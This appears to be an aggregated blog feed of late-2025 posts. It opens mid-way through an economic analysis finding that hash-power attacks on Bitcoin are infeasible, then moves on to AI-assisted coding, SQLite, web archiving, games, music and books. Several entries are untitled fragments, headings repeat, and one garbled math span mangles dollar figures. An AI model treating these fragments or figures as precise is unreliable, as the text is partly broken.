<p>The peak open interest in Bitcoin futures on the Chicago Mercantile Exchange over the past year was less than $20B, so even if we add together both kinds of exchange, the peak open interest over the last year isn't enough for the attacker.</p>
<h3>Conclusions</h3>
<p>Neither an outsider nor an insider attack appears feasible.</p>
<h4>Outsider Attack</h4>
<p>An outsider attack seems infeasible because in practice:</p>
<ul>
<li>They could not acquire 43% or more of the hash power.</li>
<li>Even if they could it would take so long as to make detection inevitable.</li>
<li>Even if they could and they were not detected, the high cost of the rigs makes the necessary shorts large relative to the open interest, and expensive to maintain.</li>
<li>These large shorts would need to be leveraged perpetual futures, bringing significant risks of loss of collateral through liquidation, and of the potential payoff being reduced through automatic de-leveraging.</li>
<li>The attacker would need more than the peak aggregate open interest in Bitcoin futures over the past year.</li>
</ul>
<h4>Insider Attack</h4>
<p>The order-of-magnitude lower direct cost of an insider attack makes it appear less infeasible, but insiders have to consider the impact on their continuing mining business. If the assumed 20% drop in the Bitcoin price were sustained for a year, the cost to the miner controlling 30% of the hash rate would be about 15,750 BTC or nearly <span class="math inline">\(1.5B making the total cost of the attack (excluding the cost of carrying the shorts) almost \)</span>2B.</p>

The drop in Bitcoin's price and the smaller, lagging <a href="https://www.ft.com/content/2012681b-67b2-496a-a7cd-4811eb497883">drop in network difficulty</a> over the last three months has decreased miners' revenue by about 25%. In the medium term a further drop is in prospect. Sometime in April 2028 the regular Bitcoin halvening will occur, halving the income of miners in aggregate Bitcoin terms.</p>

These drops turn the insiders' access to data center space and power into a double-edged sword because, as Vicky Ge Huang explains in <a href="https://www.wsj.com/tech/ai/bitcoin-miners-thrive-off-a-new-side-hustle-retooling-their-data-centers-for-ai-bdc408a9"><em>Bitcoin Miners Thrive Off a New Side Hustle: Retooling Their Data Centers for AI</em></a>:</p>
<blockquote>
<p>mining-company stocks are still flying, even with cryptocurrency prices in retreat. That's because these firms have something in common with the hottest investment theme on the planet: the massive, electricity-hungry data centers expected to power the artificial-intelligence boom. Some companies are figuring out how to remake themselves as vital suppliers to Alphabet, Amazon, Meta, Microsoft and other &quot;hyperscalers&quot; bent on AI dominance.</p>
<p>...</p>
<p>Miners often have to build new, specialized facilities, because running AI requires more-advanced cooling and network systems, as well as replacing bitcoin-mining computers with AI-focused graphics processing units. But signing deals with miners allows AI giants to expand faster and cheaper than starting new facilities from scratch.</p>
<p>...</p>
<p>Shares of Core Scientific quadrupled in 2024 after the company signed its first AI contract that February. The stock has gained 10% this year. The company now expects to exit bitcoin mining entirely by 2028.</p>
</blockquote>
<p>I wonder why the date is 2028! As profit-driven miners use their bouyant stock price to fund a <a href="https://pivot-to-ai.com/">pivot to AI</a> the hash rate and the network difficuty will decrease, making an insider attack less infeasible. The drop in their customer's income will likely encourage Bitmain to similarly pivot to AI, devoting an increasing proportion of their wafers to AI chips, especially given the Chinese government's goal of localizing AI.</p>
<p>A 30% miner whose rigs were fully depreciated might consider an insider attack shortly before the halvening as a viable exit strategy, since their future earnings from mining would be greatly reduced. But they would still be detected.</p>
<h3>Counter-measures</h3>
<p>Even if we assume the feasibility of both the hash rate and the short position aspects of the attack, it is still the case that for example, an attack with 30% of the hash power and a 95% probability of success will, on average, last 17 days. it seems very unlikely that the coincidence over an extended period of a large reduction in the expected hash rate and a huge increase in short interest would escape attention from Bitcoin HODl-ers, miners and exchanges, not to mention Bitmain. What counter-measures could they employ?</p>
<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-Rdlmwa4wUnJuwPrbjcs9qy3a6vTGf343LjXoHcyTkQBs3zce4FdNsSC__zKbwanXirtqHq4QW2CI_urbBybfLi3LunH-ol3nPsIky49xE1UI6-vMCEFTS7C-DvBe3_l4_I-lZ46rO54i4a-B4nKrwSzNcM18CmvRMZOZY025NJNtyo5pAC_fondpV7wb/s416/SatoshiTable.png"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-Rdlmwa4wUnJuwPrbjcs9qy3a6vTGf343LjXoHcyTkQBs3zce4FdNsSC__zKbwanXirtqHq4QW2CI_urbBybfLi3LunH-ol3nPsIky49xE1UI6-vMCEFTS7C-DvBe3_l4_I-lZ46rO54i4a-B4nKrwSzNcM18CmvRMZOZY025NJNtyo5pAC_fondpV7wb/w183-h200/SatoshiTable.png" alt=""></a><a href="https://bitcoin.stackexchange.com/questions/1170/why-is-6-the-number-of-confirms-that-is-considered-secure">Source</a>
The theoretically correct counter-measure would be to raise the 6-block finality criterion to the 24 blocks that corresponds to a pool with 30% of the hash power. But this would violate what people incorrectly believe is the revealed word of Satoshi. And Goharshady correctly pointed out in email that this is in any case impractical:</p>
<ul>
<li>The 6-block rule is just a convention, there is no dial that can be turned.</li>
<li>Much of the access to the Bitcoin blockchain is via APIs that typically have the 6-block rule hard-codded in.</li>
<li>Many, typically low-value, transactions do not wait for even a single confirmation.</li>
<li>Even it were possible, changing from a one-hour to a four-hour confirmation would have significant negative impacts on the Bitcoin ecosystem.</li>
</ul>
<p>In the case of an insider attack, the absence of a pool previously mining around one in three of all blocks would readily de-anonymize the attacker. Bitmain would necessarily be aware of the identity of an outside attacker. Although unregulated exchanges are notoriously poor at KYC/AML, the sums involved in the shorts are so large that they would be highly motivated to use the blockchain information to de-anonymize the attacker. Given their terms of service, and the lack of effective recourse, they would be able to ham-string the attack.</p>

<p>In essence a language model changes you from a programmer who writes lines of code, to a programmer that manages the context the model has access to, prunes irrelevant things, adds useful material to context, and writes detailed specifications. If that doesn't sound fun to you, you won't enjoy it.</p>
<p>Think about it as if it is a junior developer that has read every textbook in the world but has 0 practical experience with your specific codebase, and is prone to forgetting anything but the most recent hour of things you've told it. What do you want to tell that intern to help them progress?</p>
<p>Eg you might put sticky notes on their desk to remind them of where your style guide lives, what the API documentation is for the APIs you use, some checklists of what is done and what is left to do, etc.</p>
<p>But the intern gets confused easily if it keeps accumulating sticky notes and there are now 100 sticky notes, so you have to periodically clear out irrelevant stickies and replace them with new stickies.</p>

      <h1>2025-12-30 Xobaque doesn’t know how to deal with missing pages</h1>

      <h1>2025-12-30 Xobaque doesn’t know how to deal with missing pages</h1>
<p>I run a small number of search engine instances using <a href="Xobaque">Xobaque</a>. I haven’t thought about what to do when sites move or disappear. Xobaque doesn’t crawl the web so it doesn’t know what’s out there. All it knows is what the feeds bring in.</p>
<p>When people move from one blog to another, they are unlikely to put their entire blog into their new feed on the new domain. Their feed might contain just the ten newest blog post. Eventually, those old posts are eventually orphaned in the Xobaque database. The articles can still be found but if the redirect chain stops working, the original articles can no longer be reached.</p>
<p>And if people did provide an archive feed (see RFC 5005) that still wouldn’t invalidate the old entries already in the database. The search engine would now show every result twice with one linking to the old blog post that’s gone and with one linking to the new blog post.</p>
<p>The search engine would need a “tombstone” feed full of links to posts to be deleted.</p>
<p>Or, and to me that sounds like the worst solution, I start doing updates to the database by hand, writing SQL statements. That wouldn’t work for long. So right now I’m a bit at a loss. Any good ideas? I’m sadly unaware of any sort of protocol that would allow this.</p>

      <p>Before the pandemic I was always on the move, and I would have told you always learning. I found myself at various events, talked to many different people, was always reading something, and my job changed frequently, even within the organisation I was in. I also wrote a lot, which helped me consolidate and clarify […]</p>

      <h1>2025-12-29 Dead Archivist Society</h1>

(date: 2025-12-30)
      <p>
      <h1>2025-12-29 Dead Archivist Society</h1>
<blockquote>
<p>I was walking in the cold, carrying the backpack with our external backup drives, talking with my wife – about backups, our websites, and how I didn’t know how to keep things up after I died, that it would all crumble as soon as bills weren’t paid, and that I didn’t have any friends who had both the system administration skills and the interest in keeping my weird software collection up and running.</p>
</blockquote>
<p>One year ago I wondered about creating an association for people who wanted their digital legacy to endure. In return for this posthumous service, they would help keep the digital legacy of others alive. A bit like the Internet Archive, but independent.</p>
<p>The effort stalled because I got discouraged. For one, there was the procedural problem: How to communicate with each other? Do we need a forum? A newsgroup? A mailing list? How do we communicate securely? Using GPG encrypted mail? Delta Chat? Signal? Already things started fracturing and no community emerged. Then there was valuable feedback for the proposed articles of association that I should work into the proposal.</p>
<p>Another reason for discouragement was the technical way forward. My site doesn’t look like it has a ton of images but it does:</p>
<pre><code>   1.6 MB	 .db
   8.1 MB	 .rss
   9.5 MB	 .gz
  23.5 MB	 .md
  51.1 MB	 .mov
  52.6 MB	 .jpeg
 110.7 MB	 .mp4
 150.3 MB	 .png
2880.6 MB	 .jpg

</code></pre>
<p>This lead me to search for ways to produce a <a href="2025-12-05-low-res-archive">low-res archive</a>. I think all the social and organisational issues aside, we also need a technical proposal: How to condense archives down to manageable size so that the burden of hosting is bearable.</p>
<p>Another centralised, billionaire-sponsored option that’s always there is the Internet Archive, of course. But who knows how long it’ll last. All of Usenet was archived by Dejanews and the bought up by Google and these days it’s the private copies available from people like John Goerzen <a href="https://www.complete.org/quux-org-usenet-nntp-and-nncp-peer/">at quux.org</a> that are the most accessible.</p>
<p>And then there’s sites like Emacs Wiki where the data itself and its history is available from git repositories thanks to the efforts of people like Jonas Bernoulli and the <a href="https://github.com/emacsmirror">Emacs Mirror</a> he manages on GitHub (another centralised service sponsoring an archival effort). But what I would need, I think, is a digital executor of the will, or something like that. Somebody who can take over ownership of the domain name and keep the scripts running – and eventually migrate it all elsewhere, surely. I would need to disentangle my services (currently Emacs Wiki is hosted on the same virtual machine as all my other sites including my homepage).</p>
<p>Other than Oddmuse wiki, I also host a small number of web apps with a server component written in Perl 5, like <a href="Hex_Describe">Hex Describe</a>, <a href="Text_Mapper">Text Mapper</a>, <a href="Traveller_Subsector_Generator">Traveller Subsector Generator</a> and some others that aren’t as important. Those cannot easily be “migrated” to a new wiki engine, they need to be rewritten. Preferable using just HTML, CSS and JS.</p>
<p>One small stepping stone is that I wrote Oddmu in Go and migrated this site from Oddmuse to Oddmu. I’m currently assuming that Go has better chances of surviving into the future than Perl 5, the source files are “plain” Markdown files with as few changes as I could muster, and there’s an “export to a static site” option built right into it.</p>
<p>I think my problem is that the number of issues is large, solving them is difficult, there’s no road map, no to-do list, no checklist, no community.</p>
<p>I’m feeling overwhelmed. 😰</p>

<p>The hard part of computer programming isn’t expressing what we want the machine to do in code. The hard part is turning human thinking – with all its wooliness and ambiguity and contradictions – into <em>computational thinking</em> that is logically precise and unambiguous, and that can then be expressed formally in the syntax of a programming language.</p>
<p>That was the hard part when programmers were punching holes in cards. It was the hard part when they were typing COBOL code. It was the hard part when they were bringing Visual Basic GUIs to life (presumably to track the killer’s IP address). And it’s the hard part when they’re prompting language models to predict plausible-looking Python.</p>
<p>The hard part has always been – and likely will continue to be for many years to come – knowing <em>exactly</em> what to ask for.</p>

      <p>
      <p><strong><a href="https://github.com/simonw/shot-scraper/releases/tag/1.9">shot-scraper 1.9</a></strong></p>
<p>New release of my <a href="https://shot-scraper.datasette.io/">shot-scraper</a> CLI tool for taking screenshots and scraping websites with JavaScript from the terminal.</p>
<blockquote>
<ul>
<li>The <code>shot-scraper har</code> command has a new <code>-x/--extract</code> option which extracts all of the resources loaded by the page out to a set of files. This location can be controlled by the <code>-o dir/</code> option. <a href="https://github.com/simonw/shot-scraper/issues/184">#184</a></li>
<li>Fixed the <code>shot-scraper accessibility</code> command for compatibility with the latest Playwright. <a href="https://github.com/simonw/shot-scraper/issues/185">#185</a></li>
</ul>
</blockquote>
<p>The new <code>shot-scraper har -x https://simonwillison.net/</code> command is really neat. The inspiration was <a href="https://simonwillison.net/2025/Dec/26/slop-acts-of-kindness/#digital-forensics-with-shot-scraper-har">the digital forensics expedition</a> I went on to figure out why Rob Pike got spammed. You can now perform a version of that investigation like this:</p>
<pre><code>cd /tmp
shot-scraper har --wait 10000 'https://theaidigest.org/village?day=265' -x

</code></pre>
<p>Then dig around in the resulting JSON files in the <code>/tmp/theaidigest-org-village</code> folder.</p>

<p>But once we got that and got this aviation grade testing in place, the number of bugs just dropped to a trickle. Now we still do have bugs but the aviation grade testing allows us to move fast, which is important because in this business you either move fast or you're disrupted. So, we're able to make major changes to the structure of the code that we deliver and be confident that we're not breaking things because we had these intense tests. Probably half the time we spend is actually writing new tests, we're constantly writing new tests. And over the 17-year history, we have amassed a huge suite of tests which we run constantly.</p>
<p>Other database engines don't do this; don't have this
level of testing. But they're still high quality, I mean, I
noticed in particular, PostgreSQL is a very high-quality database engine, they don't have many bugs. I went to the PostgreSQL and ask them “how do you prevent the bugs”? We talked about this for a while. What I came away with was they've got a very elaborate peer review process, and if they've got code that has worked for 10 years they just don't mess with it, leave it alone, it
works. Whereas we change our code fearlessly, and we have a much smaller team and we don't have the peer review process.</p>

      <blockquote>
<p>The hard part of computer programming isn't expressing what we want the machine to do in code. The hard part is turning human thinking -- with all its wooliness and ambiguity and contradictions -- into <em>computational thinking</em> that is logically precise and unambiguous, and that can then be expressed formally in the syntax of a programming language.</p>
<p>That was the hard part when programmers were punching holes in cards. It was the hard part when they were typing COBOL code. It was the hard part when they were bringing Visual Basic GUIs to life (presumably to track the killer's IP address). And it's the hard part when they're prompting language models to predict plausible-looking Python.</p>
<p>The hard part has always been – and likely will continue to be for many years to come – knowing <em>exactly</em> what to ask for.</p>

      <h1>Copyright Release for Contributions To SQLite</h1>

(date: 2025-12-29)
      <p>
      <p><strong><a href="https://www.sqlite.org/copyright-release.html">Copyright Release for Contributions To SQLite</a></strong></p>
<p>D. Richard Hipp <a href="https://news.ycombinator.com/item?id=46420453#46424225">called me out</a> for spreading misinformation on Hacker News that SQLite refuses outside contributions:</p>
<blockquote>
<p>No, Simon, we don't &quot;refuse&quot;. We are just very selective and there is a lot of paperwork involved to confirm the contribution is in the public domain and does not contaminate the SQLite core with licensed code.</p>
</blockquote>
<p>I deeply regret this error! I'm linking to the copyright release document here - it looks like SQLite's public domain nature makes this kind of clause extremely important:</p>
<blockquote>
<p>[...] To the best of my knowledge and belief, the changes and enhancements that I have contributed to SQLite are either originally written by me or are derived from prior works which I have verified are also in the public domain and are not subject to claims of copyright by other parties.</p>
</blockquote>
<p>Out of curiosity I decided to see how many people have contributed to SQLite outside of the core team of Richard, Dan and Joe. I ran that query using Fossil, SQLite's own SQLite-based version control system, like this:</p>
<pre><code>brew install fossil
fossil clone https://www.sqlite.org/src sqlite.fossil
fossil sql -R sqlite.fossil &quot;
  SELECT user, COUNT(*) as commits
  FROM event WHERE type='ci'
  GROUP BY user ORDER BY commits DESC
&quot;

</code></pre>
<p>I got back 38 rows, though I think <code>danielk1977</code> and <code>dan</code> may be duplicates.</p>
<p><strong>Update</strong>: The SQLite team have clarified this on their <a href="https://sqlite.org/copyright.html">SQLite is Public Domain</a> page. It used to read &quot;In order to keep SQLite completely free and unencumbered by copyright, the project does not accept patches.&quot; - it now reads:</p>
<blockquote>
<p>In order to keep SQLite completely free and unencumbered by copyright, the project does not accept patches from random people on the internet. There is a process to get a patch accepted, but that process is involved and for smaller changes is not normally worth the effort.</p>

<p>Slack’s been pretty great for us, but it does have some limitations: conversations are automatically deleted and they’re not findable on the web in the first place.</p>
<p>The switch to Discourse means conversations will be preserved and they will be able to benefit people for years to come. And we get to use an open web app that’s also open source. Which we like very much.</p>

      <h1>Are We Ready to Be Governed by Artificial Intelligence?</h1>

(date: 2025-12-29, updated: 2025-12-26)
      <p>
      <p>Artificial Intelligence (AI) overlords are a common trope in science-fiction dystopias, but the reality looks much more prosaic. The technologies of artificial intelligence are <a href="https://mitpress.mit.edu/9780262049948/rewiring-democracy/?ref=merionwest.com">already pervading</a> many aspects of democratic government, affecting our lives in ways both large and small. This has occurred largely without our notice or consent. The result is a government incrementally transformed by AI rather than the singular technological overlord of the big screen.</p>
<p>Let us begin with the executive branch. One of the most important functions of this branch of government is to administer the law, including the human services on which so many Americans rely. Many of these programs have long been operated by a mix of humans and machines, even if not previously using modern AI tools such as ...</p>

      <h1>Music in 2025</h1>

(date: 2025-12-28)
      <p>
      <p>I really like it when people post their end-of-year music round-up. <a href="https://colly.com/journal/twenty-twentyfive-in-music">Colly</a>, <a href="https://hicks.design/journal/hicks-design-2025-annual-report">Jon</a>, and <a href="https://nazhamid.com/journal/music-in-2025/">Naz</a> have all posted about music they listened to in 2025.</p>
<p>I recognise almost none of the albums that they’ve listed. That’s because my musical brain has been almost entirely conquered by Irish traditional music.</p>
<p>2025 was a year filled with music for me. Mostly it was music that I was playing. I think I might’ve spent more time <em>playing</em> music than listening to music this year. I like that ratio.</p>
<p>Brighton has <a href="https://thesession.org/sessions/search?day=&amp;q=brighton">a healthy session scene</a>. Most weeks I get to play in more than one. Even better, I had some great tunes outside of the pub environment, calling around to people’s houses or having them over for a nice cup of tea with some jigs’n’reels.</p>
<p>Most of my travel in 2025 was music-based. <a href="https://www.scoilsamhraidhwillieclancy.com/">The Willie Clancy Summer School</a> in County Clare. <a href="https://www.belfasttraditionalmusic.com/">Belfast Trad Fest</a> in Northern Ireland. The <a href="https://www.irishfleadh.com/">Cáceres fleadh</a> in Spain. The inaugural <a href="https://www.namuririshmusicfestival.be/">Namur Irish Music Festival</a> in Belgium.</p>
<p>There’s nothing better than being in a good session, and I enjoyed some great ones this year. I think my mandolin-playing has benefited from it too.</p>
<p>I also got hold of some albums released in 2025…</p>
<p><a href="https://copleystreet.bandcamp.com/album/copley-street-2">The second Copley Street album</a> is, unsurprisingly, excellent.</p>
<p><a href="https://napiobairiuilleann.bandcamp.com/album/mn-na-bp-ob-uilleann-volume-2">The second volume of Mná na bPíob</a> is, also unsurprisingly, also excellent.</p>
<p>But I think my favourite album of 2025 is <a href="https://mauricebradleymusic.bandcamp.com/album/ran-na-heala">Òran na hEala by Maurice Bradley</a>. Terrific tunes, superb piping, and equally superb fiddle playing.</p>
<p>I’ve been in a session two with Maurice Bradley during previous tradfests in Belfast. I was looking forward to seeing him there again this year to tell him how much I like the album. Alas, he passed away shortly after the album was released. <em>Ar dheis Dé go raibh a anam</em>. A great loss to Irish music.</p>
<p>Oh, I did get <em>one</em> album released in 2025 that <em>isn’t</em> traditional Irish music, and it’s really, really good:</p>
<p><a href="https://saltercane.bandcamp.com/album/deep-black-water">Deep Black Water by Salter Cane</a>.</p>
<p>Okay, that’s cheating because I’m in the band, but honestly, I think the album is genuinely excellent. Every track is a banger, in my somewhat-biased opinion. Have a listen for yourself and see what you think.</p>
<p>My wish for 2026 is that I’ll have plenty of opportunities to play those songs live. In between all the sessions.</p>

<p>I couldn't find a good single place listing those latest versions, so I had Claude Code for web (via my phone, I'm out on errands) build a Git scraper to publish those versions in one place:</p>
<p><a href="https://simonw.github.io/actions-latest/versions.txt">https://simonw.github.io/actions-latest/versions.txt</a></p>

      <h1>To Make Software Is To Translate Human Intent Into Computational Precision</h1>

(date: 2025-12-28)
      <p>
      <p>In <a href="https://codemanship.wordpress.com/2025/11/25/the-future-of-software-development-is-software-developers/">“The Future of Software Development is Software Developers”</a> Jason Gorman alludes to how terrible natural language is at programming computers:</p>
<blockquote>
<p>The hard part of computer programming isn’t expressing what we want the machine to do in code. The hard part is turning human thinking – with all its wooliness and ambiguity and contradictions – into computational thinking that is logically precise and unambiguous, and that can then be expressed formally in the syntax of a programming language.</p>
</blockquote>
<p>The work is the <em>translation</em>, from thought to tangible artifact. Like making a movie: everyone can imagine one, but it takes a director to produce one.</p>
<p>This is also the work of software development: <em>translation</em>. You take an idea — which is often communicated via natural language — and you translate it into functioning software. <em>That</em> is the work.</p>
<p>It’s akin to someone who translates natural languages, say Spanish to English. The work isn’t the words themselves, though that’s what we conflate it with.</p>
<p>You can ask to translate “te quiero” into English. And the resulting words “I love you” may seem like a job complete. But the work isn’t coming up with the words. The work is gaining the experience to know <em>how</em> and <em>when</em> to translate the words based on clues like tone, context, and other subtleties of language. You must decipher <em>intent</em>. Does “te quiero” here mean “I love you” or “I like you” or “I care about you”?</p>
<p>This is precisely why natural language isn’t a good fit for programming: it’s not very precise. As Gorman says, “Natural languages have not evolved to be precise enough and unambiguous enough” for making software. Code is materialized intent. The question is: whose?</p>
<p>The request ”let users sign in” has to be translated into constraints, validation, database tables, async flows, etc. You need pages and pages of the written word to translate that idea into some kind of functioning software. And if you don’t fill in those unspecified details, somebody else ( <em>cough</em> AI <em>cough</em>) is just going to guess — and who wants their lives functioning on top of guessed intent?</p>
<p>Computers are pedants. They need to be told <em>precisely</em> in everything, otherwise you’ll ask for one thing and get another. “Do what I mean, not what I say” is a common refrain in working with computers. I can’t tell you how many times I’ve spent hours troubleshooting an issue only to realize a minor syntactical mistake. The computer was doing what I typed, not what I meant.</p>
<p>So the work of making software is translating human thought and intent into functioning computation (not merely writing, or generating, lines of code).</p>

      <p>With apologies for the delay, I’m happy to present you Newsboat 2.42!</p>
<p>We’ve lost momentum this time around. I (Alexander Batischev)
hasn’t contributed meaningfully for quite some time; Dennis
van der Schagt, who carried the bulk of the development, had
a bit of time off Newsboat, and it shows in the size of the
CHANGELOG. Some of the work was picked up by Forketyfork and
Juho Eerola, both of whom already contributed to Newsboat in the
past. Development is certainly in a bit of a lull, but I’d say
it’s nowhere near stopping.</p>
<p>There is no shiny new features or big highlights this time,
just a couple bug fixes and a bit of polish here and there.
Should be a seamless upgrade, perfect for the snowy holidays ☺</p>

      <h1>Substack Network error = security content they don't allow to be sent</h1>

(date: 2025-12-28)
      <p>
      <p>I just sent out the <a href="https://simonw.substack.com/p/a-new-way-to-extract-detailed-transcripts">latest edition</a> of the newsletter version of this blog. It's a long one! Turns out I wrote a lot of stuff in the past 10 days.</p>
<p>The newsletter is out two days later than I had planned because I kept running into an infuriating issue with Substack: it would refuse to save my content with a &quot;Network error&quot; and &quot;Not saved&quot; and I couldn't figure out why.</p>
<p><img src="https://static.simonwillison.net/static/2025/substack-error.jpg" alt="Screenshot of the Substack UI, with a Network error message on purple and a Not saved message higher up. The content in that editor includes an explanation of a SQL injection vulnerability."></p>
<p>So I <a href="https://chatgpt.com/share/6950ad7d-6948-8006-9833-201d2edff1be">asked ChatGPT to dig into it</a>, which dug up <a href="https://news.ycombinator.com/item?id=43793526">this Hacker News</a> post about the string <code>/etc/hosts</code> triggering an error.</p>
<p>And yeah, it turns out my newsletter included <a href="https://simonwillison.net/2025/Dec/18/ssrf-clickhouse-postgresql/">this post</a> describing a SQL injection attack against ClickHouse and PostgreSQL which included the full exploit that was used.</p>
<p>Deleting that annotated example exploit allowed me to send the letter!</p>

      <h1>2025-12-27 Fascination 2d6</h1>

(date: 2025-12-27)
      <p>
      <h1>2025-12-27 Fascination 2d6</h1>
<p>Sometimes I wonder: Why am I so enamoured with 2d6 systems when most
of the games I run use AD&amp;D 1st edition, which I do not like at all?
I mean, I use AD&amp;D 1st edition because that’s what the Wilde Gestade
multi-referee game in Greyhawk uses. And it’s the system Arden Vul
uses. So this is why I use AD&amp;D 1st edition.</p>
<p>But why do I want to run 2d6 systems? I don’t mean any system that
uses 2d6, of course. I mean the peculiar, Traveller-like games I’ve
been writing about: <a href="Halberts">Halberts</a> and <a href="Kinetic_Energy">Kinetic Energy</a>.
I wrote introductions to both games that highlight what I think is
important to me:</p>
<ul>
<li><a href="A_short_introduction_to_Halberts">A short introduction to Halberts</a></li>
<li><a href="kinetic-energy-intro">A short introduction to Kinetic Energy</a></li>
</ul>
<p>These games offer some benefits that every Traveller player
recognises.</p>
<p>The games don’t have experience levels. The characters don’t grow in
power. The numbers don’t go up. This does away with the whole question
of incentives. Perhaps that also does away with the notion that the
thing is a game? There’s no pressure to kill monsters or to take their
stuff.</p>
<p>Character creation involves rolling on tables that tell you something
about the character’s history and skills. There’s a risk associated
with rolling for more skills so “gaining experience” during character
creation can be a kind of bet. The people at the table are free to
self-impose a limit, however. Just limit characters to one term, two
terms, three terms. The benefit is that players quickly get a
character with a very rough history, possibly rivals or enemies,
allies, friends, memberships without having to effectively choose
much.</p>
<p>The skills provided during character creation are also determined
randomly. Thus, during character creation, players can influence where
their characters are going by choosing appropriate careers and
specialisations. The skills gained might not be the skills the players
wanted to get for their character, however. This again messes with our
ability to optimise a character and frees players from having to
optimise their character “build”.</p>
<p>Combat is usually short because the physical attributes are used as
hit-points. Each has a value of 2d6. All weapons do at least 2d6
points of damage. On the first round, the damage is dealt to a random
physical attribute. On subsequent rounds, damage dies can be
distributed by the player of the targetted character. When one
attribute falls to zero, the character faints. When two attributes
fall to zero, the character might very likely die.</p>
<p>For my own games, there’s an additional idea I picked up from Burning
Wheel and Powered by the Apocalypse games. These games don’t have
money. There is no pouring over equipment lists, trying to optimise
this or that. The whole mini-game of “shopping” falls away. Of course
there are still things of value, including weapons or spaceships, but
these cannot be bought at character creation and they can’t be traded
fairly. There might be barter but from a referee perspective, there is
only a gift-economy: get a thing in recognition of services rendered.</p>

      <p>AOC: Trump ran on a promise that ICE would go after the “worst&quot; criminals. But the real crime is in oligarchs taking $170b from your healthcare and food assistance to form a secret police force.</p>

      <h1>Books I read in 2025</h1>

(date: 2025-12-27)
      <p>
      <p><a href="https://adactio.com/notes/reading/2025">I read 28 books in 2025</a>. Looking back over that list, there are a few recurring themes…</p>
<p>I read less of the Greek mythology retellings than <a href="https://adactio.com/journal/tags/books,2024">last year</a> but I seem to have developed a taste for medieval stories like <a href="https://uk.bookshop.org/a/980/9781529157864">Matrix</a>, <a href="https://uk.bookshop.org/a/980/9781529329810">Nobber</a>, and <a href="https://uk.bookshop.org/a/980/9781529091168">Haven</a>.</p>
<p>I finally got ‘round to reading some classics of post-apocalypse fiction like <a href="https://uk.bookshop.org/a/980/9781857988215">Earth Abides</a> and <a href="https://uk.bookshop.org/a/980/9781399607735">I Am Legend</a>.</p>
<p>I read lots of short story collections: <a href="https://uk.bookshop.org/a/980/9781529012590">Salt Slow</a>, <a href="https://uk.bookshop.org/a/980/9781583226988">Bloodchild And Other Stories</a>, <a href="https://uk.bookshop.org/a/980/9780099588115">The Bloody Chamber And Other Stories</a>, <a href="https://uk.bookshop.org/a/980/9781408884317">Folk</a>, and <a href="https://uk.bookshop.org/a/980/9781526623317">The End of the World is a Cul de Sac</a>. There’s quite a dollop of horror in some of those.</p>
<p>I’m clearly hankering for the homeland because I read a lot of books set in Ireland: <a href="https://uk.bookshop.org/a/980/9780571396665">The Country Girls</a>, <a href="https://uk.bookshop.org/a/980/9781529091168">Haven</a>, <a href="https://uk.bookshop.org/a/980/9780861545896">Prophet Song</a>, <a href="https://uk.bookshop.org/a/980/9781526623317">The End of the World is a Cul de Sac</a>, and <a href="https://uk.bookshop.org/a/980/9781529329810">Nobber</a>.</p>
<p>And there’s the usual smattering of sci-fi from the likes of Nnedi Okorafor, Adrian Tchaikovsky, Arkady Martine, Becky Chambers, and Emily St. John Mandel.</p>
<p>Here’s what I thought of these 28 books, <a href="https://adactio.com/journal/22317">without any star ratings</a>…</p>
<h3><a href="https://uk.bookshop.org/a/980/9781857988215">Earth Abides</a> by George R. Stewart</h3>
<p>I started this one in 2024 and finished it in the first few weeks of 2025. It’s a classic piece of post-apocalypse fiction from 1949. It’s vivid and rich in detail, but there are some odd ideas that flirt with eugenics. There’s a really strange passage where the narrator skirts around describing the skin colour of his new-found love interest. I get the feeling that this was very transgressive at the time, but it’s just a bit weird now.</p>
<h3><a href="https://uk.bookshop.org/a/980/9780356516110">The Last Song Of Penelope</a> by Claire North</h3>
<p>The final book in Claire North’s Songs Of Penelope trilogy is the one that intersects the most with The Odyssey. There’s a looming sense of impending tragedy because of that; we’ve spent the last two books getting to know the handmaids of Ithica and now here comes Odysseus to fuck things up. I enjoyed the whole trilogy immensely.</p>
<h3><a href="https://uk.bookshop.org/a/980/9781529377200">Short Stories In Irish</a> by Olly Richards</h3>
<p>This is a great way to get used to reading in Irish. The stories start very simple and get slightly more complex as throughout the book. None of the stories are going to win any prizes for storytelling, but that’s not the point. If you’re learning Irish, I think this book is a great tool to augment your lessons.</p>
<h3><a href="https://uk.bookshop.org/a/980/9781529083514">Sea Of Tranquility</a> by Emily St. John Mandel</h3>
<p>Nothing will ever top the brilliance of Station Eleven but I still enjoyed this time-travel tale set in the interconnected Emily St. John Mandel cinematic universe.</p>
<h3><a href="https://uk.bookshop.org/a/980/9781805302117">The Heart In Winter</a> by Kevin Barry</h3>
<p>A very Irish western. The language is never dull and the characters are almost mythological in personality.</p>
<h3><a href="https://uk.bookshop.org/a/980/9781529157864">Matrix</a> by Lauren Groff</h3>
<p>One woman’s life in a medieval convent. What’s really engrossing is not just the changes to the protaganist over her lifetime but the changes she makes to the community.</p>
<h3><a href="https://uk.bookshop.org/a/980/9781472292209">Hera</a> by Jennifer Saint</h3>
<p>I didn’t enjoy this quite as much as Jennifer Saint’s previous books. Maybe that’s because this is set almost entirely in the milieu of gods rather than mortals.</p>
<h3><a href="https://uk.bookshop.org/a/980/9781250236210">A Psalm For The Wild-Built</a> by Becky Chambers</h3>
<p>A short book about a tea-making monk meeting a long-lost robot and going on a road trip together. It’s all quite lovely.</p>
<h3><a href="https://uk.bookshop.org/a/980/9781583226988">Bloodchild And Other Stories</a> by Octavia Butler</h3>
<p>A superb collection of short stories. Bloodchild itself is a classic, but every one of the stories in this collection is top notch. Some genuinely shudder-inducing moments.</p>
<h3><a href="https://uk.bookshop.org/a/980/9781529012590">Salt Slow</a> by Julia Armfield</h3>
<p>Staying with short story collections, this one is all killer, no filler. Julia Armfield knows how to grab you with a perfect opening line. Any one of these stories could be the basis for a whole novel. Or a David Cronenberg film.</p>
<h3><a href="https://uk.bookshop.org/a/980/9780241995679">The Voyage Home</a> by Pat Barker</h3>
<p>The third book in Pat Barker’s retelling of the aftermath of the Trojan war is just as gritty as the first two, but this one has more overt supernatural elements. A grimly satisfying conclusion.</p>
<h3><a href="https://uk.bookshop.org/a/980/9781408884317">Folk</a> by Zoe Gilbert</h3>
<p>A collection of loosely-connected short stories dripping with English supernatural folk horror. The world-building is impressive and the cumulative effect really gets under your skin.</p>
<h3><a href="https://uk.bookshop.org/a/980/9781399622950">Death of the Author</a> by Nnedi Okorafor</h3>
